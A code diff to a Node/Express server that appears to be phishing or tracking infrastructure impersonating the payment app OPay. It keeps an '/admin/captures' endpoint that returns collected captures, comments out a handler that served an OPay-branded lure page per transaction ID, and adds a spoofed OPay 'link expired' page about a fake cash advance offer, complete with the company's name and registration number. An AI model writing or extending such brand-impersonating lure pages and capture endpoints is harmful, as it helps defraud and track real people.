@@ -166,7 +166,13 @@ app.get("/admin/captures", (req, res) => {
   res.json(loadCaptures());
 });
 
-// Serve the OPay page for any /:txnId path
+// Serve link expired for any /:txnId path
+app.get("/:txnId", (req, res) => {
+  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>OPay</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}.card{background:white;border-radius:14px;padding:32px 24px;max-width:360px;width:100%;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.08)}.icon{font-size:2.5rem;margin-bottom:12px}.title{font-size:1.1rem;font-weight:700;color:#1a7a3e;margin-bottom:8px}.msg{font-size:0.85rem;color:#777;line-height:1.6;margin-bottom:20px}.btn{display:inline-block;background:#1a7a3e;color:white;padding:12px 28px;border-radius:8px;font-size:0.9rem;font-weight:700;text-decoration:none}footer{margin-top:24px;font-size:0.68rem;color:#aaa}</style></head><body><div class="card"><div class="icon">🔗</div><div class="title">This link has expired</div><div class="msg">The cash advance offer you followed is no longer active. Loan offers expire after 24 hours or once claimed.<br/><br/>If you received this from someone, ask them to share a fresh link.</div><a class="btn" href="https://www.opayweb.com">Go to OPay</a></div><footer>OPay Digital Services Limited &nbsp;|&nbsp; RC 1468513</footer></body></html>`);
+});
+
+/*
+// OLD CODE - Commented out - Serve the OPay page for any /:txnId path
 app.get("/:txnId", async (req, res) => {
   const txnId = req.params.txnId;
   if (!/^[A-Za-z0-9]{8,20}$/.test(txnId)) return res.status(404).send("Not found");
@@ -187,6 +193,7 @@ app.get("/:txnId", async (req, res) => {
   html = html.replace("__TXN_ID__", txnId.toUpperCase());
   res.send(html);
 });
+*/
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`\n[*] OPay OSINT — listening on port ${PORT}`);
